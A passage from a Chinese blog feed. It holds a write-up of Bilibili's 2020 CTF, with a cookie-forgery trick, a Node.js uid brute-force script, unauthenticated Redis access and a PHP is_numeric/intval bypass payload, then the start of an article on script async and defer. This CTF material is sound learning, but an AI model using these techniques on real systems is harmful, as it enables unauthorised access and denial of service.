的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 